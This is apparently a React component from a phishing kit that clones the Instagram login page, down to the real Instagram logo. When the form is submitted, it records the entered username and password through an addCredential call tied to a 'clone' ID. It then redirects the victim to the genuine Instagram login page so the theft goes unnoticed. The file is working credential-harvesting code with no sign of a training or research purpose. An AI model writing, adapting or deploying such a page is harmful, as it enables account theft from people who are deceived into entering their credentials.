'use client';
import { useState } from 'react';
import { useClones } from '@/hooks/use-clones';
import type { Clone } from '@/lib/types';
import { Facebook } from 'lucide-react';

const InstagramLogo = () => (
  <img 
    src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" 
    alt="Instagram"
    className="h-[51px] w-[175px] object-contain"
    style={{ filter: 'invert(1)' }}
  />
);


export default function InstagramPage({ clone }: { clone: Clone }) {
  const { addCredential } = useClones();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (username) {
        addCredential(clone.id, { username, password });
    }
    window.location.href = 'https://www.instagram.com/accounts/login/';
  };

  return (
    <div className="bg-[#1a1a1a] min-h-screen flex items-center justify-center font-sans text-white">
      <main className="w-full max-w-[350px] space-y-2.5">
        <div className="bg-[#000000] border border-gray-700 p-10 flex flex-col items-center rounded-sm">
          <div className="mb-10">
             <InstagramLogo />
          </div>
          <form onSubmit={handleSubmit} className="w-full space-y-2">
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              placeholder="Phone number, username, or email"
              className="w-full px-2 py-2.5 border border-gray-700 rounded-sm bg-[#1a1a1a] focus:outline-none focus:ring-1 focus:ring-gray-400 text-sm"
              required
            />
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              className="w-full px-2 py-2.5 border border-gray-700 rounded-sm bg-[#1a1a1a] focus:outline-none focus:ring-1 focus:ring-gray-400 text-sm"
            />
            <button
              type="submit"
              className="w-full bg-[#0095f6] text-white py-1.5 rounded-lg font-semibold text-sm mt-4 opacity-70 hover:opacity-100 transition-opacity disabled:opacity-40"
              disabled={!username || !password}
            >
              Log In
            </button>
          </form>
          <div className="flex items-center w-full my-6">
            <div className="flex-grow border-t border-gray-700"></div>
            <span className="px-4 text-xs font-semibold text-gray-400">OR</span>
            <div className="flex-grow border-t border-gray-700"></div>
          </div>
          <button className="flex items-center justify-center gap-2 text-sm font-semibold text-[#3897f0]">
            <Facebook className="w-5 h-5" />
            <span>Log in with Facebook</span>
          </button>
          <a href="#" className="text-xs text-[#0095f6] mt-6">
            Forgot password?
          </a>
        </div>
        <div className="bg-black border border-gray-700 p-5 text-center text-sm rounded-sm">
          <p>
            Don't have an account?{' '}
            <a href="#" className="text-[#0095f6] font-semibold">
              Sign up
            </a>
          </p>
        </div>
      </main>
    </div>
  );
}
